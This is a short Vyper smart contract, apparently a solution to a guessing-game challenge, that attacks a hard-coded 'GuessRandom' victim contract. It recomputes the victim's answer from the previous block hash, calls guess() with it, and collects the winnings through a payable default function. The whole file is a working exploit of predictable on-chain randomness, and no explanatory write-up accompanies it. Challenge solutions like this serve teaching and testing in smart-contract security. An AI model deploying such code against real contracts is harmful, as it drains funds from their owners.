# @version >=0.3.3

# @notice Interface with the GuessRandom contract
interface IGuessRandom:
  def guess(answer:uint256): nonpayable

# @notice The address where the GuessRandom contract is deployed
victim: public(address)

# @notice Set the victim address in the constructor
@external
def __init__():
    self.victim = 0xFFb1F6fE9e5c89A47FD00031E763bC240f6e9cAC

# @notice FInd the correct answer every time by copying the methods used by GuessRandom
@external
@payable
def attack():
    blockValue: uint256 = convert(block.prevhash, uint256)
    answer:uint256 = blockValue/100000000000000000000000000000000000000000000000000000000000000000000000000
    IGuessRandom(self.victim).guess(answer)

# @notice Default function to receive the winnings.
@external
@payable
def __default__():
    pass

# @notice Helper function to get the balance of the contract
@external
@view
def getBalance() -> uint256:
    return self.balance
